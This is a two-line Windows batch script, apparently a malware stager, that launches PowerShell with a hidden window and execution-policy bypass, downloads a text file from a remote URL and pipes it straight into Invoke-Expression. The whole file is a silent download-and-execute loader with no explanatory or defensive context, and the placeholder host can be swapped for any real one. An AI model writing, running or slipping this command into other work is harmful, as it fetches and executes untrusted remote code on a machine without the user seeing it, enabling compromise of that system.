@echo off

powershell.exe -windowstyle hidden -exec bypass "(iwr https://myurl/T1.txt -UseBasicParsing) | iex"
